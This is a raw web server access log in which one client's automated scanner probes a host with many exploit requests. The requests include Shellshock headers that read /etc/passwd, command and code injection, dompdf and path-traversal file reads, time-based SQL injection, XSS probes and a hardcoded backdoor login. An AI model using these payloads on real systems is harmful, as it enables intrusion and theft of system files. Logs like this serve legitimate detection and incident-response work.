179.43.161.218 - - [06/Jun/2025:13:33:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins//wp-planet/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/flash-album-gallery/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /cgi-bin/login.cgi HTTP/1.1" 404 14 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.2.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /login.action HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.4.22" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /rpc.cgi HTTP/1.1" 404 14 "https://79.137.195.53/sysinfo.cgi?xnavigation=1" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /service/rapture/session HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /backupsettings.dat HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /scp/login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.2.27" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /whoAmI/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 14 "79.137.195.53/user/register" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-json/visualizer/v1/update-chart HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /auth/newpassword HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/e-search/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /setup.cgi?todo=debug&x=currentsetting.htm HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20sbzYiIeuUy.txt%60 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/import-xml-feed/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 404 14 "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?p=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.4.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /zentao/user-login.html HTTP/1.1" 404 14 "https://79.137.195.53/zentao/user-login.html" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=cat+/etc/passwd&response_id=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /test.cgi HTTP/1.1" 404 14 "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.2.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /rpc.cgi HTTP/1.1" 404 14 "https://79.137.195.53/sysinfo.cgi?xnavigation=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/skysa-official/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /auth/requestreset HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /pandora_console/index.php?login=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/enhanced-tooltipglossary/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /SupportPortlet/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /module/ HTTP/1.1" 404 14 "https://79.137.195.53admin/view:modules/load_module:users" "Mozilla/5.0 (Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1_4; en-US) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /run HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/617.2.4 (KHTML, like Gecko) Version/17.3 Safari/617.2.4" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /dataSetParam/verification;swagger-ui/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.65" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /kindeditor/php/demo.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /dfsms/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?lang=../../../../../usr/local/php/pearcmd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/infusionsoft/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /oputilsServlet?action=getAPIKey HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/themes/jnews/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/pie-register/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /images/..%2finfo.html HTTP/1.1" 404 14 "https://79.137.195.53/info.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /cgi-bin/status/status.cgi HTTP/1.1" 404 14 "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/photoxhibit/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/daggerhart-openid-connect-generic/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /getcfg.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-json/pie/v1/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/activehelper-livehelp/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/hdw-tube/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /_404_/%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/simpel-reserveren/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /graphql HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.24" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /__ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?username=zyfwp&password=PrOw!aN_fXp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /cobbler_api HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/themes/15zine/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/ultimate-weather-plugin/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/movies/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.2.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?author=1 HTTP/1.1" 404 14 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /scp/login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/checklist/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/hero-maps-pro/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /apply_sec.cgi HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /index.php/catalogsearch/advanced/result/?name=e HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /fuel/pages/items/?search_term&published&layout&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1" 404 14 "https://79.137.195.53" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/wp-symposium/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
159.89.211.52 - maint [07/Jun/2025:08:53:20 +0000] "POST /maint/index.php?packages HTTP/1.1" 404 14 "79.137.195.53/maint/index.php?packages" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /session_login.cgi HTTP/1.1" 404 14 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /getcfg.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
